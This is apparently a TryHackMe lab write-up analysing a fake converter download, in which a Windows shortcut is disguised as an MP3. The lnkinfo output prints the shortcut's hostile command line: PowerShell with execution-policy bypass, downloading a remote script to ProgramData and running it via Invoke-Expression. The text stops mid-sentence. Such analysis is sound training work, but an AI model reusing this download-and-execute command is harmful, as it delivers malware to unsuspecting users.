# Threat Analysis Report: TryHackMe - Day1

## **Case Overview**
- **Website Involved:** All-in-One Converter
- **URL Pasted:** https://www.youtube.com/watch?v=AN_R4pR1hck
- **Files Delivered:** `download.zip` containing:
  - `song.mp3`
  - `somg.mp3`
 
## **File Details**

### **song.mp3**
- File Type: Audio file
- Metadata:
  - ID3 version 2.3.0
  - MPEG ADTS, layer III, v1
  - Bitrate: 192 kbps, 44.1 kHz, Stereo
- No suspicious activity detected during initial inspection.
- Evidence:
```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ file song.mp3          
song.mp3: Audio file with ID3 version 2.3.0, contains: MPEG ADTS, layer III, v1, 192 kbps, 44.1 kHz, Stereo
```

### **somg.mp3**
- File Type: Windows Shortcut (.lnk)
- Metadata:
  - **Target Path:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
  - **Size:** 448 KB
- Evidence:
```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ file somg.mp3 
somg.mp3: MS Windows shortcut, Item id list present, Points to a file or directory, Has Relative path, Has Working directory, Has command line arguments, Unicoded, MachineID win-base-2019, EnableTargetMetadata KnownFolderID 1AC14E77-02E7-4E5D-B744-2EB1AE5198B7, Archive, ctime=Sat Sep 15 06:14:14 2018, atime=Sat Sep 15 06:14:14 2018, mtime=Sat Sep 15 06:14:14 2018, length=448000, window=normal, IDListSize 0x020d, Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

#### Further Analysis of somg.mp3

```┌──(intrusus㉿attck)-[~/Downloads/TryHackMe/Day1]
└─$ lnkinfo somg.mp3          
lnkinfo 20230716

Windows Shortcut information:
        Contains a link target identifier
        Contains a relative path string
        Contains a working directory string
        Contains a command line arguments string
        Number of data blocks           : 4

Link information:
        Creation time                   : Sep 15, 2018 07:14:14.454767300 UTC
        Modification time               : Sep 15, 2018 07:14:14.454767300 UTC
        Access time                     : Sep 15, 2018 07:14:14.454767300 UTC
        File size                       : 448000 bytes
        Icon index                      : 0
        Show Window value               : 0x00000001
        Hot Key value                   : 0
        File attribute flags            : 0x00000020
                Should be archived (FILE_ATTRIBUTE_ARCHIVE)
        Drive type                      : Fixed (3)
        Drive serial number             : 0xa8a4c362
        Volume label                    : 
        Local path                      : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
        Relative path                   : ..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
        Working directory               : C:\\Windows\\System32\\WindowsPowerShell\\v1.0
        Command line arguments          : -ep Bypass -nop -c "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1','C:\\ProgramData\\s.ps1'); iex (Get-Content 'C:\\ProgramData\\s.ps1' -Raw)"

Link target identifier:
        Shell item list
                Number of items         : 7

        Shell item: 1
                Item type               : Root folder
                Class type indicator    : 0x1f (Root folder)
                Shell folder identifier : 20d04fe0-3aea-1069-a2d8-08002b30309d
                Shell folder name       : My Computer

        Shell item: 2
                Item type               : Volume
                Class type indicator    : 0x2f (Volume)
                Volume name             : C:\

        Shell item: 3
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : Windows
                Modification time       : May 17, 2023 19:45:40
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : Windows
                Creation time           : Sep 15, 2018 06:09:28
                Access time             : May 17, 2023 19:45:40
                NTFS file reference     : MFT entry: 986, sequence: 1

        Shell item: 4
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : System32
                Modification time       : Oct 30, 2024 14:10:32
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : System32
                Creation time           : Sep 15, 2018 06:09:28
                Access time             : Oct 30, 2024 14:10:32
                NTFS file reference     : MFT entry: 30079, sequence: 1

        Shell item: 5
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : WindowsPowerShell
                Modification time       : Sep 15, 2018 07:19:02
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : WindowsPowerShell
                Creation time           : Sep 15, 2018 07:19:02
                Access time             : Sep 15, 2018 07:19:02
                NTFS file reference     : MFT entry: 31432, sequence: 1

        Shell item: 6
                Item type               : File entry
                Class type indicator    : 0x31 (File entry: Directory)
                Name                    : v1.0
                Modification time       : Sep 15, 2018 09:07:34
                File attribute flags    : 0x00000010
                        Is directory (FILE_ATTRIBUTE_DIRECTORY)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : v1.0
                Creation time           : Sep 15, 2018 07:19:02
                Access time             : Sep 15, 2018 09:07:34
                NTFS file reference     : MFT entry: 31433, sequence: 1

        Shell item: 7
                Item type               : File entry
                Class type indicator    : 0x32 (File entry: File)
                Name                    : powershell.exe
                Modification time       : Sep 15, 2018 07:14:16
                File attribute flags    : 0x00000020
                        Should be archived (FILE_ATTRIBUTE_ARCHIVE)
        Extension block: 1
                Signature               : 0xbeef0004 (File entry extension)
                Long name               : powershell.exe
                Creation time           : Sep 15, 2018 07:14:16
                Access time             : Sep 15, 2018 07:14:16
                NTFS file reference     : MFT entry: 203979, sequence: 1

Data block: 1
        Signature                       : 0xa0000005 (Special folder location)

Data block: 2
        Signature                       : 0xa000000b (Known folder location)

Data block: 3
        Signature                       : 0xa0000003 (Distributed link tracker properties)
        Machine identifier              : win-base-2019
        Droid volume identifier         : f6953da0-d6bb-4c14-8dd4-1d39a7683054
        Droid file identifier           : 1be092cd-96c8-11ef-82da-02a0a1a4abe5
        Birth droid volume identifier   : f6953da0-d6bb-4c14-8dd4-1d39a7683054
        Birth droid file identifier     : 1be092cd-96c8-11ef-82da-02a0a1a4abe5

Data block: 4
        Signature                       : 0xa0000009 (Metadata property store)
        {dabd30ed-0043-4789-a7f8-d013a4736622}/100 (PKEY_ItemFolderPathDisplayNarrow)
                Value (0x001f)          : v1.0 (C:\Windows\System32\WindowsPowerShell)

        {46588ae2-4cbc-4338-bbfc-139326986dce}/4 (Unknown)
                Value (0x001f)          : S-1-5-21-1966530601-3185510712-10604624-500

        {b725f130-47ef-101a-a5f1-02608c9eebac}/10 (PKEY_ItemNameDisplay)
                Value (0x001f)          : powershell.exe

        {b725f130-47ef-101a-a5f1-02608c9eebac}/15 (PKEY_DateCreated)
                Value (0x0040)          : Sep 15, 2018 07:14:16.000000000 UTC

        {b725f130-47ef-101a-a5f1-02608c9eebac}/12 (Unknown)
                Value (0x0015)          : 448000

        {b725f130-47ef-101a-a5f1-02608c9eebac}/4 (PKEY_ItemTypeText)
                Value (0x001f)          : Application

        {b725f130-47ef-101a-a5f1-02608c9eebac}/14 (PKEY_DateModified)
                Value (0x0040)          : Sep 15, 2018 07:14:14.454767300 UTC

        {28636aa6-953d-11d2-b5d6-00c04fd918d0}/30 (PKEY_ParsingPath)
                Value (0x001f)          : C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe

        {446d16b1-8dad-4870-a748-402ea43d788c}/104 (System.VolumeId)
                Value (0x0048)          : 19127295-0000-0000-0000-100000000000
```
- The `.lnk` file targets the PowerShell executable and uses encoded commands to bypass execution policies and download a malicious script (`IS.ps1`) from:
  - **URL:** `https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1`
- The script is saved locally to `C:\ProgramData\s.ps1` and executed using `iex` (Invoke-Expression).
- The script 

![image](https://github.com/user-attachments/assets/c4fcba26-9855-4666-80a8-a4413f13798c)
